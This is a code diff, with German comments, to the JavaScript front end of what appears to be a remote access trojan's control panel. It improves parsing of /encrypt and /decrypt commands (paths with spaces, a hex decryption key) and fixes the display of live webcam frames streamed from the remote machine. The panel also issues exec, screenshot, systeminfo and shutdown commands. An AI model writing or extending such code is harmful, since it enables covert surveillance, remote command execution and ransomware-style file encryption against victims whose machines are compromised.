@@ -843,6 +843,19 @@
       if (!cmdText.startsWith("/")) return null;
       const [slash, ...args] = cmdText.trim().split(" ");
       const action = slash.replace("/", "");
+      // --- Anpassung für /encrypt und /decrypt: alles bis zum letzten Argument ist der Pfad ---
+      if (action === "encrypt") {
+        // /encrypt [pfad mit leerzeichen]
+        return { action, path: args.join(" ") || "." };
+      }
+      if (action === "decrypt") {
+        // /decrypt [pfad mit leerzeichen] [key_hex]
+        if (args.length < 2) return { action, path: args.join(" ") || ".", key_hex: "" };
+        const key_hex = args[args.length - 1];
+        const path = args.slice(0, -1).join(" ") || ".";
+        return { action, path, key_hex };
+      }
+      // ...rest wie gehabt...
       const argument = args.join(" ");
       switch (action) {
         case "exec":
@@ -859,12 +872,6 @@
           return { action, path: argument || "." };
         case "cd":
           return { action, path: argument || "." };
-        case "encrypt":
-          return { action, path: argument || "." };
-        case "decrypt": {
-          const [path, key_hex] = args;
-          return { action, path: path || ".", key_hex: key_hex || "" };
-        }
         case "screenshot":
         case "systeminfo":
         case "shutdown":
@@ -949,7 +956,20 @@
         if (webcamArea) webcamArea.style.display = "";
         // 2. Nächstes Frame ist das Bild (base64)
         ws.onmessage = function (event2) {
-          if (typeof event2.data === "string" && event2.data.length > 100) {
+          // Fix: Prüfe, ob das Frame base64 ist, sonst als Binärdaten behandeln
+          let b64 = null;
+          // Server sendet als {action: "webcam_frame", img_base64: ...}
+          try {
+            const d = JSON.parse(event2.data);
+            if (d.action === "webcam_frame" && d.img_base64) {
+              b64 = d.img_base64;
+            }
+          } catch {
+            if (typeof event2.data === "string" && event2.data.length > 100) {
+              b64 = event2.data;
+            }
+          }
+          if (b64) {
             const img = new window.Image();
             img.onload = function () {
               webcamCanvas.width = img.width;
@@ -958,14 +978,12 @@
               ctx.clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
               ctx.drawImage(img, 0, 0, img.width, img.height);
             };
-            img.src = "data:image/jpeg;base64," + event2.data;
+            img.src = "data:image/jpeg;base64," + b64;
             if (webcamStatus) webcamStatus.textContent = "Live-Webcam";
-            // Nach Verarbeitung wieder auf Standard setzen
             ws.onmessage = wsMessageHandler;
           }
         };
       } else {
-        // Fallback: Standardhandler
         wsMessageHandler(event);
       }
     }
